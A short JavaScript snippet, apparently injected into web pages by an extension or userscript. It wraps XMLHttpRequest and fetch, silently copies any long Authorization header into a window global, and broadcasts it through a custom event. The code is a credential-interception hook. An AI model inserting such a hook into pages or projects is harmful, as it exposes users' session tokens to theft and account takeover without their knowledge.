(function(){
  'use strict';
  const orig = XMLHttpRequest.prototype.setRequestHeader;
  XMLHttpRequest.prototype.setRequestHeader = function(n,v){
    if(n&&n.toLowerCase()==='authorization'&&v&&v.length>20){
      window.__MGT__=v; window.__MGTS__=Date.now();
      window.dispatchEvent(new CustomEvent('__mgt__',{detail:v}));
    }
    return orig.apply(this,arguments);
  };
  const oFetch=window.fetch;
  window.fetch=function(...a){
    try{
      const init=a[1];
      if(init&&init.headers){
        let auth=null;
        if(init.headers instanceof Headers) auth=init.headers.get('Authorization')||init.headers.get('authorization');
        else if(typeof init.headers==='object') auth=init.headers['Authorization']||init.headers['authorization'];
        if(auth&&auth.length>20){window.__MGT__=auth;window.__MGTS__=Date.now();window.dispatchEvent(new CustomEvent('__mgt__',{detail:auth}));}
      }
    }catch(_){}
    return oFetch.apply(this,a);
  };
})();
